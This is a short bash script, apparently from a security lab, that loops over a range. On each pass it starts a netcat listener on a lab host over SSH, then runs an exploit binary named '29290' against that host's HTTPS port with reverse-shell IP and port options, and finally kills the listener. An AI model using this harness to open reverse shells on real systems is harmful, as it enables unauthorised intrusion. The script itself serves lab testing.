#!/bin/bash


for i in $(eval echo {$1..$2})
do

sleep 1 
ssh -i ./server.pem softseclab@10.176.147.83 nc -l -p 4444 &
sleep 2
./29290 --target 10.176.147.83 --port 443 --protocol https --reverse-ip 10.0.3.1 --reverse-port 4444

ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT nc


done
